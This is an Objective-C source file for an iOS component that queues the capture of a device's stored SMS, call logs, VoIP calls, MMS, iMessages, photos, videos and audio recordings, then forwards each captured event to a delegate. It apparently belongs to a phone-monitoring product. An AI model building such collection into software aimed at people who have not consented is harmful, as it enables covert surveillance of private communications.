//
//  HistoricalEventManagerImpl.m
//  HistoricalEventManager
//
//  Created by Benjawan Tanarattanakorn on 12/3/2557 BE.
//
//

#import "HistoricalEventManagerImpl.h"

// Historical Event Operation Import
#import "HistoricalEventCallOP.h"
#import "HistoricalEventSMSOP.h"
#import "HistoricalEventVoIPOP.h"
#import "HistoricalEventMMSOP.h"
#import "HistoricalEventAudioOP.h"
#import "HistoricalEventIMessageOP.h"

#ifdef IOS_ENTERPRISE
#import "HistoricalMediaEventManager-E.h"
#import "HistoricalEventImageOP-E.h"
#import "HistoricalEventVideoOP-E.h"
#else
#import "HistoricalMediaEventManager.h"
#import "HistoricalEventImageOP.h"
#import "HistoricalEventVideoOP.h"
#endif

#import <Photos/Photos.h>

@interface HistoricalEventManagerImpl (private)
- (void) informDelegateWhenAllOperationsDone;
@end


@implementation HistoricalEventManagerImpl


@synthesize mConfigurationManager;


- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate  = aEventDelegate;
        
        mQueue          = [[NSOperationQueue alloc] init];
        [mQueue setMaxConcurrentOperationCount:1];
        
        #ifdef IOS_ENTERPRISE
        [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
            DLog(@"STATUS %ld", (long)status);
        }];
        #endif
	}
	return self;
}

- (id)init
{
    self = [super init];
    if (self) {
        NSException *exception = [NSException exceptionWithName:@"Wrong init" reason:@"Wrong init method" userInfo:nil];
        [exception raise];
    }
    return self;
}

#pragma mark - Protocol HistoricalEventManager

/*
- (BOOL) captureHistoricalEvents: (unsigned long long) aEvents
                            mode: (HistoricalEventCaptureMode) aMode
                        delegate: (id <HistoricalEventDelegate>) aDelegate {
    
    DLog(@"captureHistoricalEvents event %llu mode %d", aEvents, aMode)
    BOOL operationIssued    = NO;
    mDelegate               = aDelegate;
    
    mEventFlag              = aEvents;
    
    NSThread *currentThread = [NSThread currentThread];
    
    // -- SMS ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeSMS) {
        DLog(@"Will add SMS capruting to queue")
        HistoricalEventSMSOP *smsOp   = [[HistoricalEventSMSOP alloc] initWithDelegate:self
                                                                                thread:currentThread
                                                                              selector:@selector(operationCompleted:)
                                                                                  mode:aMode];
        [smsOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"SMS completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:smsOp];
        [smsOp autorelease];
        operationIssued = YES;
    }

    // -- Call ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeCallLog) {
        DLog(@"Will add CALL capruting to queue")
        HistoricalEventCallOP *callOp   = [[HistoricalEventCallOP alloc] initWithDelegate:self
                                                                                   thread:currentThread
                                                                                 selector:@selector(operationCompleted:)
                                                                                     mode:aMode];
        [callOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"Call completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:callOp];
        [callOp autorelease];
        operationIssued = YES;
    }
    
    
    // -- Facetime VoIP ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeVoIP) {
        DLog(@"Will add VoIP capruting to queue")
        HistoricalEventVoIPOP *voIPOp   = [[HistoricalEventVoIPOP alloc] initWithDelegate:self
                                                                                   thread:currentThread
                                                                                 selector:@selector(operationCompleted:)
                                                                                     mode:aMode];
        [voIPOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"VoIP completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:voIPOp];
        [voIPOp autorelease];
        operationIssued = YES;
    }

    return (operationIssued);
}
 */

- (BOOL) captureHistoricalEvents: (unsigned long long) aEvents
                     totalNumber: (NSInteger) aTotalNumber
                        delegate: (id <HistoricalEventDelegate>) aDelegate {
    
    DLog(@"captureHistoricalEvents event %llu total number %ld", aEvents, (long)aTotalNumber)
    BOOL operationIssued    = NO;
    mDelegate               = aDelegate;
    
    mEventFlag              = aEvents;
    
    NSThread *currentThread = [NSThread currentThread];
    
    // -- SMS ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeSMS) {
        DLog(@"Will add SMS capturing to queue")
        HistoricalEventSMSOP *smsOp   = [[HistoricalEventSMSOP alloc] initWithDelegate:self
                                                                                thread:currentThread
                                                                              selector:@selector(operationCompleted:)
                                                                           totalNumber:aTotalNumber];
        [smsOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"SMS completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:smsOp];
        [smsOp autorelease];
        operationIssued = YES;
    }
    
    // -- Call ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeCallLog) {
        DLog(@"Will add CALL capturing to queue")
        HistoricalEventCallOP *callOp   = [[HistoricalEventCallOP alloc] initWithDelegate:self
                                                                                   thread:currentThread
                                                                                 selector:@selector(operationCompleted:)
                                                                              totalNumber:aTotalNumber];
        [callOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"Call completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:callOp];
        [callOp autorelease];
        operationIssued = YES;
    }
    
    
    // -- Facetime VoIP ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeVoIP) {
        DLog(@"Will add VoIP capturing to queue")
        HistoricalEventVoIPOP *voIPOp   = [[HistoricalEventVoIPOP alloc] initWithDelegate:self
                                                                                   thread:currentThread
                                                                                 selector:@selector(operationCompleted:)
                                                                              totalNumber:aTotalNumber];
        [voIPOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"VoIP completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:voIPOp];
        [voIPOp autorelease];
        operationIssued = YES;
    }
    
    
    // -- MMS ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeMMS) {
        DLog(@"Will add MMS capturing to queue")
        HistoricalEventMMSOP *mmsOp   = [[HistoricalEventMMSOP alloc] initWithDelegate:self
                                                                                thread:currentThread
                                                                              selector:@selector(operationCompleted:)
                                                                           totalNumber:aTotalNumber];
        [mmsOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"MMS completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:mmsOp];
        [mmsOp autorelease];
        operationIssued = YES;
    }
    
    // -- iMessage ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeIMIMessage) {
        DLog(@"Will add iMessage capturing to queue")
        HistoricalEventIMessageOP *iMessageOp   = [[HistoricalEventIMessageOP alloc] initWithDelegate:self
                                                                                               thread:currentThread
                                                                                             selector:@selector(operationCompleted:)
                                                                                          totalNumber:aTotalNumber];
        [iMessageOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"iMessage completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:iMessageOp];
        [iMessageOp autorelease];
        operationIssued = YES;
    }

    // -- Camera Image ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeCameraImage) {
        DLog(@"Will add Camera Image capturing to queue")
        
        if (!mHistoricalCameraImageEventManager) {
            DLog(@"Firstly create Historical Media Event Manager")
            mHistoricalCameraImageEventManager  = [[HistoricalMediaEventManager alloc] initWithDelegate:self
                                                                                         selector:@selector(operationCompleted:)];
        }
        
        HistoricalEventImageOP *imageOp   = [[HistoricalEventImageOP alloc] initWithDelegate:mHistoricalCameraImageEventManager
                                                                                      thread:currentThread
                                                                                    selector:@selector(searchOperationCompleted:)
                                                                                 totalNumber:aTotalNumber];
        [imageOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"Camera Image completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:imageOp];
        [imageOp autorelease];
        operationIssued = YES;
    }

    // -- Video ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeVideoFile) {
        DLog(@"Will add Video capturing to queue")
        
        if (!mHistoricalVideoEventManager) {
            DLog(@"Firstly create Historical Media Event Manager")
            mHistoricalVideoEventManager  = [[HistoricalMediaEventManager alloc] initWithDelegate:self
                                                                                         selector:@selector(operationCompleted:)];
        }
        
        HistoricalEventVideoOP *videoOp   = [[HistoricalEventVideoOP alloc] initWithDelegate:mHistoricalVideoEventManager
                                                                                      thread:currentThread
                                                                                    selector:@selector(searchOperationCompleted:)
                                                                                 totalNumber:aTotalNumber];
        [videoOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"Video completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:videoOp];
        [videoOp autorelease];
        operationIssued = YES;
    }
    
    // -- Audio ----------------------------------------------------
    
    if (aEvents & kHistoricalEventTypeAudioRecording) {
        DLog(@"Will add Audio capturing to queue")
        
        if (!mHistoricalAudioEventManager) {
            DLog(@"Firstly create Historical Media Event Manager")
            mHistoricalAudioEventManager  = [[HistoricalMediaEventManager alloc] initWithDelegate:self
                                                                                         selector:@selector(operationCompleted:)];
        }
        
        HistoricalEventAudioOP *audioOp   = [[HistoricalEventAudioOP alloc] initWithDelegate:mHistoricalAudioEventManager
                                                                                      thread:currentThread
                                                                                    selector:@selector(searchOperationCompleted:)
                                                                                 totalNumber:aTotalNumber];
        [audioOp setCompletionBlock:^{
            DLog(@"----------------------------------------------------------------------");
            DLog(@"Audio completion block");
            DLog(@"----------------------------------------------------------------------");
        }];
        // add all operations to the queue
        [mQueue addOperation:audioOp];
        [audioOp autorelease];
        operationIssued = YES;
    }

    
    return (operationIssued);

}

#pragma mark - Called by operation. We assign this method as Selector argument


- (void) operationCompleted: (NSDictionary *) aData {

    HistoricalEventType eventType   = [aData[kHistoricalEventTypeKey] unsignedIntValue];
    
    DLog(@"*************************** OP COMPLETE type [%d] ********************************", eventType)
    
    DLog(@"Complete Capture Data [%@]", aData)
    NSError *error                  = aData[kHistoricalEventErrorKey];
    DLog(@"error, %@", error)
    
    // -- Inform progress
    if ([mDelegate respondsToSelector:@selector(captureHistoricalEventsProgress:error:)]) {
        DLog(@"capture historical progress")
		[mDelegate captureHistoricalEventsProgress:eventType
                                             error:error];
	}
    
    // -- Toggle the completed event
	DLog(@">> before set flag: %lu", (unsigned long)mCompletedEventFlag)
    
	mCompletedEventFlag = mCompletedEventFlag | eventType;
    
	DLog(@">> after set flag: %lu", (unsigned long)mCompletedEventFlag)
    
    DLog(@"mEventFlag %llu mCompletedEventFlat %llu", mEventFlag, mCompletedEventFlag)
    
//    switch (eventType) {
//        case kHistoricalEventTypeSMS:
//            DLog(@"DONE SMS JA")
//            break;
//        case kHistoricalEventTypeCallLog:
//            DLog(@"DONE CALL JA")
//            break;
//        case kHistoricalEventTypeEmail:
//            DLog(@"DONE EMAIL JA")
//            break;
//        case kHistoricalEventTypeMMS:
//            DLog(@"DONE MMS JA")
//            break;
//        case kHistoricalEventTypeContact:
//            DLog(@"DONE CONTACT JA")
//            break;
//        case kHistoricalEventTypeCameraImage:
//            DLog(@"DONE IMAGE JA")
//            break;
//        case kHistoricalEventTypeAudioRecording:
//            DLog(@"DONE AUDIO JA")
//            break;
//        case kHistoricalEventTypeVideoFile:
//            DLog(@"DONE VIDEO JA")
//            break;
//        case kHistoricalEventTypeBrowserURL:
//            DLog(@"DONE URL JA")
//            break;
//        case kHistoricalEventTypeVoIP:
//            DLog(@"DONE VOIP JA")
//            break;
//        case kHistoricalEventTypeIMIMessage:
//            DLog(@"DONE iMessage JA")
//            break;
//        default:
//            break;
//    }
    
    NSArray *fxeventArray = aData[kHistoricalEventDataKey];
    DLog(@"fxevent %@", fxeventArray)
    
    // Event Sending
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        if ([fxeventArray isKindOfClass:[NSArray class]]) {
            DLog(@"Sending %@", fxeventArray)
            for (FxEvent *event in fxeventArray) {
                DLog(@">>> send %@", event)
                [mEventDelegate performSelector:@selector(eventFinished:) withObject:event withObject:self];
            }
        }
	}
    
    // -- Inform Delegate
    [self informDelegateWhenAllOperationsDone];
}

- (void) informDelegateWhenAllOperationsDone {
    DLog(@"inform delegate ? flag now %llu flag to be completed %llu", mEventFlag, mCompletedEventFlag)
    if (mEventFlag == mCompletedEventFlag) {
        DLog(@" **************************************** ")
        DLog(@" ***** Done all capturing operation ***** ")
        DLog(@" **************************************** ")
        
		if ([mDelegate respondsToSelector:@selector(captureHistoricalEventsDidFinished)]) {
			[mDelegate performSelector:@selector(captureHistoricalEventsDidFinished) withObject:nil];
		}
		DLog(@">> operation count %d", (int)[mQueue operationCount]);
		[mQueue cancelAllOperations];
        mCompletedEventFlag = 0;
    }
    else {
        DLog(@"Going to Continue the next operation")
    }
}

- (void) dealloc {
	DLog(@"HistoricalEventManagerImpl dealloc");
	
	[mQueue cancelAllOperations];
	[mQueue release];
	mQueue = nil;
	
	mDelegate = nil;
    
    [mHistoricalCameraImageEventManager release];
    [mHistoricalVideoEventManager release];
    [mHistoricalAudioEventManager release];
    
	[super dealloc];
}


// This is called by each operation


@end
